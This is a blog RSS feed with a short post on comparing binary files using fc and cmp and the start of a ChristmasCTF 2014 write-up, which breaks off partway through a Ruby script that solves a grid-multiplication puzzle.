<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Yous</title>
    <description>Blog for hackers.</description>
    <link>http://yous.be/</link>
    <atom:link href="http://yous.be/atom.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 23 Mar 2015 19:32:12 +0900</pubDate>
    <lastBuildDate>Mon, 23 Mar 2015 19:32:12 +0900</lastBuildDate>
    <generator>Jekyll v3.0.0.pre.beta2</generator>
    
      <item>
        
        <title>Comparing binary files</title>
        
        <description>&lt;h2&gt;Seeing differences between files&lt;/h2&gt;

&lt;p&gt;As using &lt;a href=&quot;http://git-scm.com/&quot;&gt;Git&lt;/a&gt;, looking changes of files with &lt;code&gt;git diff&lt;/code&gt; is common. Always we can check the status of files with &lt;code&gt;git status&lt;/code&gt;, including whether there is a new file that isn&amp;rsquo;t added to index, existence of changed files.&lt;/p&gt;

&lt;p&gt;I downloaded the syllabus of each course I registered before the start of the semester. This is the first week of semester, professors introduce their course with the &lt;em&gt;adjusted&lt;/em&gt; syllabus. Of course I can access the updated ones, but I can&amp;rsquo;t sure that the files which already I have are the same with which I downloaded right before. I want to keep the old one and the new one both, avoid just overwriting them.&lt;/p&gt;

&lt;h2&gt;Comparing binary files&lt;/h2&gt;

&lt;p&gt;I just wanted to check whether two binary files are the same or not, no matter what the difference is.&lt;/p&gt;

&lt;h3&gt;Windows&lt;/h3&gt;

&lt;p&gt;You can use &lt;a href=&quot;http://www.computerhope.com/fchlp.htm&quot;&gt;&lt;code&gt;fc&lt;/code&gt;&lt;/a&gt;, file compare, which is Microsoft DOS command.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bat&quot; data-lang=&quot;bat&quot;&gt;fc /b file1 file2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;/b&lt;/code&gt; flag is for a binary comparison. If two files are the same, it prints a message like &amp;lsquo;FC: no differences encountered&amp;rsquo;, if they&amp;rsquo;re not, it shows each byte of two files per line.&lt;/p&gt;

&lt;h3&gt;Unix&lt;/h3&gt;

&lt;p&gt;You can use &lt;a href=&quot;http://en.wikipedia.org/wiki/Cmp_(Unix)&quot;&gt;&lt;code&gt;cmp&lt;/code&gt;&lt;/a&gt; which compares two files byte by byte.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;cmp file1 file2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When two files are the same, it prints no message and return 0. If they are different, it prints some message and return 1.&lt;/p&gt;
</description>
        <pubDate>Tue, 03 Mar 2015 19:13:29 +0900</pubDate>
        <link>http://yous.be/2015/03/03/comparing-binary-files/</link>
        <guid isPermaLink="true">http://yous.be/2015/03/03/comparing-binary-files/</guid>
        
        
        <category>Technology</category>
        
      </item>
    
      <item>
        
        <title>ChristmasCTF 2014 Write-up</title>
        
        <description>&lt;p&gt;&lt;img src=&quot;/images/2014/12/26/christmasctf-1.png&quot; alt=&quot;ChristmasCTF&quot; title=&quot;ChristmasCTF&quot;&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#are-you-able-to-multiply&quot;&gt;Are you able to multiply? - ALGO200&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#jingle-bell&quot;&gt;JingleBell - MISC200&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#krystal-holic&quot;&gt;KrystalHolic - WEB400&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#a-letter-to-her&quot;&gt;A Letter To Her - WEB100&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#a-letter-to-her-2&quot;&gt;A Letter To Her 2 - WEB500&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#weight-and-measures&quot;&gt;WEIGHT AND MEASURES - ALGO200&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#php-obfuscate&quot;&gt;PHP Obfuscate - WEB500&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#trace&quot;&gt;Trace - MISC100&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;&lt;a id=&quot;are-you-able-to-multiply&quot;&gt;&lt;/a&gt;Are you able to multiply? - ALGO200&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;곱하기는 정말 어렵지 않나요?&lt;/p&gt;

&lt;p&gt;서버 : prob2.christmasctf.com 4725&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;열심히 곱셈을 하는 문제입니다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;n * n 의 (10 &amp;lt;= n &amp;lt;= 30) 격자와, 자연수 x 가 주어집니다

n * n 격자 안에서 x 개의 인접한 수들의 곱의 최대값을 구하시오(수평, 수직, 대각선, 역대각선 모두 포함)

정답 제출 방식 :

수평으로 곱이 최대값이라면, hori_곱의결과
수직으로의 곱이 최대값이라면, verti_곱의결과
대각선으로의 곱이 최대값이라면 diago_곱의결과
역대각선으로의 곱이 최대값이라면 condiago_곱의결과

정답을 위와 같은 방식으로 제출 해 주십시오

Stage (0 / 20)

03 62 13 99 80 78 15 75 21 07 41 77 47 85 58 57 36 13 79 22 59
72 69 08 52 05 50 54 58 09 02 51 15 57 73 06 63 61 44 20 92 04
46 76 62 81 95 28 22 54 20 06 40 12 12 97 71 50 05 22 64 73 05
91 33 82 19 89 62 31 87 15 76 85 34 07 16 26 57 01 50 73 68 53
17 22 69 10 16 50 08 97 40 53 69 51 87 33 62 36 80 39 01 71 42
06 46 83 13 74 15 07 05 68 51 87 70 35 19 20 86 70 07 72 67 72
91 19 64 41 48 37 88 02 08 27 14 51 08 60 72 09 69 27 32 37 09
28 52 42 44 59 21 69 08 32 42 02 92 79 37 32 37 19 88 69 39 29
84 27 31 26 60 32 83 66 72 21 87 39 50 95 13 19 95 72 98 76 38
18 06 50 28 68 58 48 44 01 47 93 44 53 27 27 98 20 42 04 57 36
99 34 88 92 90 38 77 50 55 13 33 44 49 09 22 88 70 15 23 75 05
19 20 44 79 98 04 65 45 03 30 46 31 74 47 75 70 45 95 26 93 21
91 48 42 20 81 80 74 63 34 32 06 56 41 06 79 52 81 03 26 43 21
69 80 24 04 36 04 14 42 56 31 29 92 12 40 92 88 57 33 16 83 76
33 83 63 42 35 50 42 23 92 95 48 52 81 64 49 79 15 57 26 71 92
78 39 12 72 18 98 59 97 35 95 55 35 37 49 19 93 34 11 04 81 91
22 52 84 70 09 27 83 91 84 13 81 55 82 49 43 89 13 07 37 84 94
52 29 80 39 20 22 13 95 19 71 08 76 68 94 33 53 20 70 42 93 81
79 57 76 12 51 76 62 48 79 90 62 60 46 81 98 89 96 60 28 20 63
28 25 14 24 58 01 46 59 63 87 17 54 83 55 93 94 99 36 52 19 10
79 92 48 29 80 57 53 94 66 99 09 32 37 69 56 19 42 60 76 01 47


x = 6

answer&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;곱합시다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;socket&#39;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;TCPSocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;prob2.christmasctf.com&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4725&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Instruction&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65536&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;kp&quot;&gt;loop&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# Stage&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1_000_000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each_line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/^\d/&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vg&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/x = (\d+)/&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;x = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;hori&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;reduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;hori&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hori&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;verti&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;times&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;col_idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;row_idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;reduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;row_idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;col_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;verti&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verti&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;diago&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;reduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;col&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;diago&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diago&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;condiago&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;reduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matrix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;col&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
